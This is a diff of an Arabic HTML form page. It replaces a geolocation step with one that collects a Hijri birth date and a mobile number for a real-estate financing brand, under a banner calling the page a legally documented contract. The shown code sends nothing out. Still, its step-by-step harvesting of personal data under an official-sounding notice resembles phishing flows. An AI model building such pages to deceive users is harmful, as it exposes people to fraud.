@@ -1,103 +1,153 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>الخطوة 5 - تحديد الموقع</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link href="https://fonts.googleapis.com/css2?family=Tajawal&display=swap" rel="stylesheet">
+  <meta charset="UTF-8" />
+  <title>تاريخ الميلاد ورقم الجوال</title>
   <style>
     body {
       font-family: 'Tajawal', sans-serif;
-      background-color: #f4f6f7;
-      margin: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      background-color: #f9f9f9;
       color: #004d40;
+      margin: 0;
+      padding: 0;
     }
     .container {
-      background: white;
+      max-width: 650px;
+      margin: 40px auto;
+      background-color: #fff;
       padding: 30px;
-      border-radius: 10px;
+      border-radius: 12px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      text-align: center;
-      max-width: 400px;
-      width: 90%;
+      border: 2px solid #004d40;
     }
-    button, input {
-      font-size: 16px;
-      padding: 12px 20px;
+    .company-name {
+      background-color: #e6f9ec;
+      padding: 10px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: bold;
+      color: #006400;
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      font-size: 18px;
       margin-top: 15px;
+    }
+    select, input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
       border-radius: 8px;
       border: 1px solid #ccc;
+      margin-top: 10px;
     }
     button {
+      width: 100%;
+      padding: 15px;
+      font-size: 18px;
       background-color: #00796b;
       color: white;
+      border: none;
+      border-radius: 8px;
       cursor: pointer;
-      width: 100%;
+      margin-top: 20px;
     }
-    button:hover {
-      background-color: #004d40;
+    button:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
     }
-    #manualAddress {
-      width: 100%;
-      display: none;
+    .alert {
+      background-color: #fff3cd;
+      border: 1px solid #ffeeba;
+      padding: 15px;
+      border-radius: 8px;
+      font-size: 16px;
+      color: #856404;
+      margin-top: 20px;
     }
-    .note {
-      margin-top: 10px;
-      color: red;
-      font-weight: bold;
+    footer {
+      margin-top: 30px;
+      padding-top: 10px;
+      border-top: 1px solid #ccc;
       font-size: 14px;
+      text-align: center;
+      color: #777;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>هل تسمح بمشاركة موقعك الجغرافي؟</h2>
-    <button onclick="getLocation()">نعم، شارك موقعي</button>
-    <button onclick="refuseLocation()">لا، أُفضل إدخال العنوان يدويًا</button>
+    <div class="company-name">سرعة تملك العقار والحلول التمويلية المتكاملة</div>
 
-    <input type="text" id="manualAddress" placeholder="اكتب عنوانك هنا" />
+    <label>تاريخ الميلاد (هجري):</label>
+    <select id="day" onchange="checkAllFields()">
+      <option value="">اليوم</option>
+    </select>
+    <select id="month" onchange="checkAllFields()">
+      <option value="">الشهر</option>
+    </select>
+    <select id="year" onchange="checkAllFields()">
+      <option value="">السنة</option>
+    </select>
 
-    <div class="note" id="noteMessage"></div>
+    <label for="mobile">رقم الجوال:</label>
+    <input type="tel" id="mobile" placeholder="05XXXXXXXX" maxlength="10" oninput="checkAllFields()" />
+
+    <button id="nextBtn" onclick="saveAndNext()" disabled>اكمل</button>
+
+    <div class="alert">
+      ⚠️ <strong>تنبيه:</strong> يتم حماية هذا العقد وتوثيقه بموجب <strong>المادة التاسعة من نظام المعاملات الإلكترونية</strong>، ويُعد سجلًا إلكترونيًا موثقًا وحجة نظامية معتبرة في الإثبات أمام الجهات الرسمية.
+    </div>
+
+    <footer>
+      <p id="dateTime"></p>
+      <p>جميع الحقوق محفوظة لشركة سرعة تملك العقار</p>
+    </footer>
   </div>
 
   <script>
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(success, error);
-      } else {
-        document.getElementById("noteMessage").textContent = "المتصفح لا يدعم تحديد الموقع";
+    function populateSelects() {
+      for (let d = 1; d <= 30; d++) {
+        document.getElementById("day").innerHTML += `<option value="${d}">${d}</option>`;
+      }
+      const months = ["محرم", "صفر", "ربيع أول", "ربيع آخر", "جمادى أول", "جمادى آخر", "رجب", "شعبان", "رمضان", "شوال", "ذو القعدة", "ذو الحجة"];
+      months.forEach((m, i) => {
+        document.getElementById("month").innerHTML += `<option value="${i+1}">${m}</option>`;
+      });
+      for (let y = 1370; y <= 1446; y++) {
+        document.getElementById("year").innerHTML += `<option value="${y}">${y}</option>`;
       }
     }
 
-    function success(position) {
-      const coords = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
-      localStorage.setItem("client_location", coords);
-      localStorage.setItem("location_status", "مشاركة الموقع");
+    function checkAllFields() {
+      const day = document.getElementById("day").value;
+      const month = document.getElementById("month").value;
+      const year = document.getElementById("year").value;
+      const mobile = document.getElementById("mobile").value;
+      const isMobileValid = /^05\d{8}$/.test(mobile);
+      document.getElementById("nextBtn").disabled = !(day && month && year && isMobileValid);
+    }
+
+    function saveAndNext() {
+      const dateHijri = `${document.getElementById("day").value}/${document.getElementById("month").value}/${document.getElementById("year").value}`;
+      const mobile = document.getElementById("mobile").value;
+      localStorage.setItem("birthHijri", dateHijri);
+      localStorage.setItem("mobile", mobile);
       window.location.href = "step6.html";
     }
 
-    function error() {
-      document.getElementById("noteMessage").textContent = "حدث خطأ أثناء تحديد الموقع. يُرجى إدخال العنوان يدويًا.";
-      document.getElementById("manualAddress").style.display = "block";
+    function updateDateTime() {
+      const now = new Date();
+      const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+      const time = now.toLocaleTimeString('ar-EG');
+      const date = now.toLocaleDateString('ar-EG', options);
+      document.getElementById("dateTime").textContent = `التاريخ: ${date} - الوقت: ${time}`;
     }
 
-    function refuseLocation() {
-      document.getElementById("manualAddress").style.display = "block";
-      document.getElementById("noteMessage").textContent = "تم رفض مشاركة الموقع، يُرجى إدخال العنوان يدويًا";
-    }
-
-    document.getElementById("manualAddress").addEventListener("blur", function () {
-      const address = this.value;
-      if (address.length > 3) {
-        localStorage.setItem("client_location", address);
-        localStorage.setItem("location_status", "تم إدخال العنوان يدويًا");
-        window.location.href = "step6.html";
-      }
-    });
+    populateSelects();
+    updateDateTime();
+    setInterval(updateDateTime, 1000);
   </script>
 </body>
 </html>
